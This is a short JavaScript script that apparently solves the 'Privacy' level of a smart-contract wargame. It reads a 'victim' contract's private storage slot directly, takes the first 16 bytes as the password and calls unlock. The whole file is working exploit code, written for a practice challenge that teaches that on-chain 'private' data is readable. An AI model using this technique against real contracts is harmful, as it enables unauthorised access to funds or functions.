const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load victim contract.')
    const victim = loader.web3.fromArtifact('Privacy', instance)

    console.log('Get storage data in slot 5...')
    const data = await web3.eth.getStorageAt(instance, 5)

    const password = data.slice(0, 34)
    console.log(`The password bytestring (first 16 bytes) is ${password}`)

    console.log('Pass it to the unlock function...')
    await victim.methods.unlock(password).send()
    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
